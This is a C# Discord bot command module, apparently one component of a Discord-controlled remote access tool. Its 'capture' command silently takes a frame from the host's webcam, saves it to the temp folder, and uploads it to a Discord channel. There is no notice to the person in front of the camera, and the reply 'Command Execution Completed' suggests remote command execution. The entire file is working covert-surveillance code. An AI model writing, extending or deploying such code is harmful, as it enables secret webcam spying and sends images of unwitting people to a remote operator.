using Discord.Commands;
using System.Threading.Tasks;
using System.Drawing;
using System.IO;
using System;
using AForge.Video;
using AForge.Video.DirectShow;
using System.Drawing.Imaging;

public class Capture : ModuleBase<SocketCommandContext>
{
    [Command("capture")]
    public async Task CaptureCmd()
    {
        FilterInfoCollection videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);

        if (videoDevices.Count > 0)
        {
            VideoCaptureDevice videoSource = new VideoCaptureDevice(videoDevices[0].MonikerString);

            Bitmap image = null;
            videoSource.NewFrame += (s, e) =>
            {
                image = (Bitmap)e.Frame.Clone();
            };

            videoSource.Start();

            await Task.Delay(1000);

            videoSource.SignalToStop();
            videoSource.WaitForStop();

            if (image != null)
            {
                string imagePath = Path.Combine(Path.GetTempPath(), "capture.jpg");
                image.Save(imagePath, ImageFormat.Jpeg);

                await Context.Channel.SendFileAsync(imagePath);
                await ReplyAsync("Command Execution Completed");
            }
            else
            {
                await ReplyAsync("Failed to capture image.");
            }
        }
        else
        {
            await ReplyAsync("No video devices found.");
        }
    }
}
